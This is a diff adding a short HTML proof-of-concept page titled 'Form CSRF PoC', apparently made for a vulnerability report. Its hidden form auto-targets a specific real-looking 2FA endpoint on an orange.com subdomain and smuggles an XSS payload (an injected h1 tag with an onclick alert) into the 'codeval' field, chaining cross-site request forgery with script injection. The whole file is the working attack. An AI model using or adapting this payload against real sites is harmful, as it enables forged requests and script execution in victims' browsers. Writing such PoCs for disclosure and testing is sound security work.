@@ -1,0 +1,12 @@
+<!DOCTYPE html>
+<html lang="en">
+	<body>
+		<h1>Form CSRF PoC</h1>
+		<form method="POST" action="https://passcadeau.orange.com/identification_2fa_ctrl.php">
+			<input type="hidden" name="codeenvoi" value="code_validation">
+			<input type="hidden" name="codetype" value="email">
+			<input type="hidden" name="codeval" value="111111><h1 onclick=alert(1)>aa">
+			<input type="submit" value="Submit Request">
+		</form>
+	</body>
+</html>
